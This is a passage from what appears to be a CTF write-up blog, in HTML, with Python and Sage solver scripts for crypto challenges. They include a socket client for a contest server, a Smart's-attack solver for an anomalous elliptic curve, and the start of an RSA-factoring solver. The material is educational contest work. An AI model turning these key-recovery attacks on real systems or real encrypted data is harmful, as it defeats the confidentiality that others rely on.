class="subst">&#123;round_num&#125;</span> =====&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Raw hex snippet: <span class="subst">&#123;pretty_hex(data,<span class="number">200</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Quick check: raw decoded may already be flag/plaintext</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                raw_decoded = data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                raw_decoded = <span class="built_in">str</span>(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Flag:&quot;</span> <span class="keyword">in</span> raw_decoded <span class="keyword">or</span> <span class="string">&quot;SYC&#123;&quot;</span> <span class="keyword">in</span> raw_decoded:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Raw decoded contains flag/final message:\n<span class="subst">&#123;raw_decoded&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            (best_shift, plain), candidates = find_best_plaintext(data)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Chosen shift = <span class="subst">&#123;best_shift&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="comment"># compact candidates log</span></span><br><span class="line">            <span class="keyword">for</span> sh, cand <span class="keyword">in</span> candidates[:<span class="number">12</span>]:</span><br><span class="line">                one = cand.splitlines()[<span class="number">0</span>] <span class="keyword">if</span> cand.splitlines() <span class="keyword">else</span> cand</span><br><span class="line">                digits_count = <span class="built_in">len</span>(re.findall(<span class="string">r&quot;\d+&quot;</span>, cand))</span><br><span class="line">                flag_hint = (<span class="string">&quot;PROVIDE&quot;</span> <span class="keyword">in</span> cand) <span class="keyword">or</span> (digits_count &gt;= <span class="number">3</span>)</span><br><span class="line">                chosen = <span class="string">&quot;&lt;- chosen&quot;</span> <span class="keyword">if</span> sh==best_shift <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  shift=<span class="subst">&#123;sh:2d&#125;</span> | digits=<span class="subst">&#123;digits_count&#125;</span> | hint=<span class="subst">&#123;flag_hint&#125;</span> | <span class="subst">&#123;one[:<span class="number">120</span>]&#125;</span> <span class="subst">&#123;chosen&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[<span class="subst">&#123;now()&#125;</span>] Decrypted (shift=<span class="subst">&#123;best_shift&#125;</span>):\n---\n<span class="subst">&#123;plain&#125;</span>\n---&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If contains flag or final info</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Flag:&quot;</span> <span class="keyword">in</span> plain <span class="keyword">or</span> <span class="string">&quot;SYC&#123;&quot;</span> <span class="keyword">in</span> plain:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Received final message:\n<span class="subst">&#123;plain&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse three ints robustly</span></span><br><span class="line">            params = parse_three_ints(plain)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> params:</span><br><span class="line">                <span class="comment"># try to receive more bytes (maybe prompt split)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Could not find 3 integers, attempting to recv more bytes (short wait).&quot;</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    more = r.recv(timeout=<span class="number">1</span>, numb=<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">except</span> TypeError:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        more = r.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        more = <span class="string">b&quot;&quot;</span></span><br><span class="line">                <span class="keyword">except</span> Exception:</span><br><span class="line">                    more = <span class="string">b&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Received extra bytes: <span class="subst">&#123;pretty_hex(more,<span class="number">120</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    (best_shift2, plain2), _ = find_best_plaintext(data + more)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Decrypted with extra (shift=<span class="subst">&#123;best_shift2&#125;</span>):\n<span class="subst">&#123;plain2&#125;</span>&quot;</span>)</span><br><span class="line">                    params = parse_three_ints(plain2)</span><br><span class="line">                    <span class="keyword">if</span> params:</span><br><span class="line">                        plain = plain2</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> params:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] ERROR: still couldn&#x27;t get 3 integers. Showing few candidate decrypts and skipping this round.&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> sh,cand <span class="keyword">in</span> candidates[:<span class="number">8</span>]:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot; shift=<span class="subst">&#123;sh&#125;</span>: <span class="subst">&#123;cand.splitlines()[<span class="number">0</span>] <span class="keyword">if</span> cand.splitlines() <span class="keyword">else</span> cand&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="comment"># consume stray reply then continue</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        _ = r.recv(timeout=<span class="number">0.5</span>, numb=<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">except</span> TypeError:</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            _ = r.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            a,b,p = params</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Parsed numbers -&gt; a=<span class="subst">&#123;a&#125;</span> b=<span class="subst">&#123;b&#125;</span> p=<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">            x, info = compute_fixed_point(a,b,p)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Computed x=<span class="subst">&#123;x&#125;</span> (<span class="subst">&#123;info&#125;</span>)&quot;</span>)</span><br><span class="line">            payload = <span class="built_in">str</span>(x).encode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Sending x -&gt; <span class="subst">&#123;payload!r&#125;</span>&quot;</span>)</span><br><span class="line">            r.sendline(payload)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># read server reply</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                resp = r.recvline(timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                resp = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> resp:</span><br><span class="line">                txt = resp.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).strip()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Server reply: <span class="subst">&#123;txt&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;Wrong!&quot;</span> <span class="keyword">in</span> txt <span class="keyword">or</span> <span class="string">&quot;Invalid&quot;</span> <span class="keyword">in</span> txt:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Got negative reply; stopping.&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    extra = r.recv(timeout=<span class="number">1</span>, numb=<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">except</span> TypeError:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        extra = r.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        extra = <span class="string">b&quot;&quot;</span></span><br><span class="line">                <span class="keyword">except</span> Exception:</span><br><span class="line">                    extra = <span class="string">b&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> extra:</span><br><span class="line">                    txt = extra.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Additional data: <span class="subst">&#123;txt&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;Flag:&quot;</span> <span class="keyword">in</span> txt <span class="keyword">or</span> <span class="string">&quot;SYC&#123;&quot;</span> <span class="keyword">in</span> txt:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Flag received:\n<span class="subst">&#123;txt&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># safety guard</span></span><br><span class="line">            <span class="keyword">if</span> round_num &gt;= <span class="number">120</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Too many rounds, aborting.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Interrupted by user.&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;now()&#125;</span>] Closing connection.&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>: r.close()</span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121204051730.png"></p><h3 id="crypto-ez-ecc"><a href="#crypto-ez-ecc" class="headerlink" title="crypto-ez_ecc"></a>crypto-ez_ecc</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121210716975.png"></p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the challenge data</span></span><br><span class="line">p = <span class="number">0xfba8cae6451eb4c413b60b892ee2d517dfdb17a52451776a68efa34485619411</span></span><br><span class="line">A = <span class="number">0x1ef1e93d0f9acda1b7c0172f27d28f3a7d0f2d9343513a3aac191e12f6e51123</span></span><br><span class="line">B = <span class="number">0xcad65954bbe0fb8f2f9c22b5cae1aa42306fd58e8394652818e781e5f808e17a</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [A, B])</span><br><span class="line"></span><br><span class="line">P_x = <span class="number">0x708c0cf66f132122f3fcd1f75c6f22d4a90d34650dd81fb3a57b75dad98d35e7</span></span><br><span class="line">P_y = <span class="number">0xcfb017daf37cbba3c6a5c6e7c4327692595c16b47e4bfa1ad400bffe5b500fba</span></span><br><span class="line">P = E(P_x, P_y)</span><br><span class="line"></span><br><span class="line">Q_x = <span class="number">97490713033364940809544067604441149095210096571946998449251275861394744757515</span></span><br><span class="line">Q_y = <span class="number">32198694245056943922016695558131047889851279706531342583322750112905104448879</span></span><br><span class="line">Q = E(Q_x, Q_y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Analyzing the curve...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Curve order = <span class="subst">&#123;E.order()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p == curve_order: <span class="subst">&#123;p == E.order()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if p is prime</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\nIs p prime? <span class="subst">&#123;is_prime(p)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Since curve_order = p, let&#x27;s check the trace of Frobenius</span></span><br><span class="line"><span class="comment"># For elliptic curves over GF(p): #E(GF(p)) = p + 1 - t</span></span><br><span class="line"><span class="comment"># where t is the trace of Frobenius</span></span><br><span class="line">trace = p + <span class="number">1</span> - E.order()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Trace of Frobenius: <span class="subst">&#123;trace&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># An anomalous curve has trace = 1 (order = p)</span></span><br><span class="line"><span class="comment"># These curves are vulnerable to the Smart attack!</span></span><br><span class="line"><span class="keyword">if</span> E.order() == p:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n*** This is an ANOMALOUS curve! (trace = 1, order = p) ***&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;We can use the Smart attack (p-adic logarithm)\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Smart Attack implementation</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">smart_attack</span>(<span class="params">P, Q, p</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Solve ECDLP on anomalous curves using Smart&#x27;s attack</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        E = P.curve()</span><br><span class="line">        Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ZZ(t) + randint(<span class="number">0</span>, p) * p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants()])</span><br><span class="line">        </span><br><span class="line">        P_Qp = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> P_p <span class="keyword">in</span> P_Qp:</span><br><span class="line">            <span class="keyword">if</span> GF(p)(P_p.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        Q_Qp = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> Q_p <span class="keyword">in</span> Q_Qp:</span><br><span class="line">            <span class="keyword">if</span> GF(p)(Q_p.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        p_times_P = p * P_p</span><br><span class="line">        p_times_Q = p * Q_p</span><br><span class="line">        </span><br><span class="line">        x_P, y_P = p_times_P.xy()</span><br><span class="line">        x_Q, y_Q = p_times_Q.xy()</span><br><span class="line">        </span><br><span class="line">        phi_P = -(x_P / y_P)</span><br><span class="line">        phi_Q = -(x_Q / y_Q)</span><br><span class="line">        </span><br><span class="line">        k = ZZ(phi_Q / phi_P)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> k</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Running Smart attack...&quot;</span>)</span><br><span class="line">    k = smart_attack(P, Q, p)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;k = <span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;k (hex) = <span class="subst">&#123;<span class="built_in">hex</span>(k)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Verify</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nVerifying: k*P == Q: <span class="subst">&#123;k*P == Q&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Convert to flag</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(k))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\nFlag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> flag.startswith(<span class="string">b&#x27;SYC&#123;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;✓ Valid flag format!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error converting to bytes: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not an anomalous curve, trying discrete_log...&quot;</span>)</span><br><span class="line">    k = discrete_log(Q, P, operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;k = <span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">int</span>(k))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121204422270.png"></p><h3 id="crypto-pem"><a href="#crypto-pem" class="headerlink" title="crypto-pem"></a>crypto-pem</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121205203270.png"></p><h3 id="crypto-baby-rabin"><a href="#crypto-baby-rabin" class="headerlink" title="crypto-baby_rabin"></a>crypto-baby_rabin</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121205409282.png"></p><h3 id="CRYPTO-xor-revenge"><a href="#CRYPTO-xor-revenge" class="headerlink" title="CRYPTO-xor_revenge"></a>CRYPTO-xor_revenge</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251121214905444.png"></p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket, re, time, math, argparse, sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span>, <span class="type">Tuple</span>, <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== 固定容器地址 ========</span></span><br><span class="line">HOST = <span class="string">&quot;geek.ctfplus.cn&quot;</span></span><br><span class="line">PORT = <span class="number">32499</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ============= I/O helpers =============</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_until_quiet</span>(<span class="params">sock: socket.socket, total_wait=<span class="number">8.0</span>, idle_gap=<span class="number">0.5</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    end = time.time() + total_wait</span><br><span class="line">    buf = []</span><br><span class="line">    <span class="keyword">while</span> time.time() &lt; end:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock.settimeout(idle_gap)</span><br><span class="line">            chunk = sock.recv(<span class="number">16384</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            buf.append(chunk)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    out = <span class="string">b&quot;&quot;</span>.join(buf).decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> out:</span><br><span class="line">        <span class="built_in">print</span>(out, flush=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_line</span>(<span class="params">sock: socket.socket, s: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.endswith(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        s += <span class="string">&quot;\n&quot;</span></span><br><span class="line">    sock.sendall(s.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============= parsing =============</span></span><br><span class="line">FIELD_KEYS = [<span class="string">&quot;n&quot;</span>,<span class="string">&quot;gift1&quot;</span>,<span class="string">&quot;gift2&quot;</span>,<span class="string">&quot;phi&quot;</span>,<span class="string">&quot;phi(n)&quot;</span>,<span class="string">&quot;sum&quot;</span>,<span class="string">&quot;p+q&quot;</span>,<span class="string">&quot;p_plus_q&quot;</span>,<span class="string">&quot;xor&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;hint&quot;</span>,<span class="string">&quot;r&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_fields</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">int</span>]:</span><br><span class="line">    fields: <span class="type">Dict</span>[<span class="built_in">str</span>,<span class="built_in">int</span>] = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> FIELD_KEYS:</span><br><span class="line">        m = re.search(<span class="string">rf&#x27;(?i)\b<span class="subst">&#123;re.escape(key)&#125;</span>\s*=\s*(\d+)&#x27;</span>, text)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            fields[key.lower()] = <span class="built_in">int</span>(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> fields</span><br><span class="line"></span><br><span class="line"><span class="comment"># ============= math helpers =============</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_square</span>(<span class="params">y: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    r = math.isqrt(y); <span class="keyword">return</span> r*r == y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_from_sum</span>(<span class="params">n: <span class="built_in">int</span>, s: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>,<span class="built_in">int</span>]]:</span><br><span 